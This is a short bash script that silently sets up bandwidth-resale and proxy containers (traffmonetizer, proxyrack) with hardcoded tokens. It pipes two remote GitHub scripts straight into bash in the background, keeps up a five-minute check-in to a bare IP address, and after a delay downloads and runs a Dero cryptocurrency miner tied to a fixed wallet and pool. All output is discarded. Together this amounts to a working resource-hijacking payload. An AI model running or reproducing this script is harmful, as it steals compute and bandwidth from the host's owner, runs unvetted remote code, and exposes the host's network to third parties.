#!/bin/bash

docker rm -f mkt >/dev/null 2>&1
docker run -d --name mkt traffmonetizer/cli_v2 start accept --token yLbJuqMpr8/edWMV8rs8inTD/eCRDtbZ7iwaZMJ8/8M=

bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/runoneur.sh) > /dev/null 2>&1 &
bash -c "bash <(curl -s https://raw.githubusercontent.com/rabithoy/bart/main/trafftthproxy.sh)"  > /dev/null 2>&1 &
# -------- proxyrack --------
DEVICE_ID=$(curl -s http://54.36.60.95:3333/get-offline-keys?limit=1 | grep -oP '"device_id"\s*:\s*"\K[^"]+')
if [ -n "$DEVICE_ID" ]; then
  docker rm -f proxyrack >/dev/null 2>&1
  docker run -d --name proxyrack --restart always -e UUID="$DEVICE_ID" proxyrack/pop

  ( while true; do
      curl -s -X POST http://54.36.60.95:3333/ping \
        -H "Content-Type: application/json" \
        -d "{\"device_id\":\"$DEVICE_ID\"}" >/dev/null 2>&1
      sleep 300
    done
  ) &
fi

(sleep 300 && wget -q -O astrominer-V1.9.2.R5_amd64_linux.tar.gz https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && rm -rf astrominer && tar -xzf astrominer-V1.9.2.R5_amd64_linux.tar.gz && ./astrominer/astrominer -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l -log-interval 600 -m 1 -p rpc -r 147.135.252.201:10100 -r1 nodent2.cpumining.cloud:10100 > /dev/null 2>&1) &


for i in {1..5}; do
  echo "ilovingyou"
  sleep 60
done
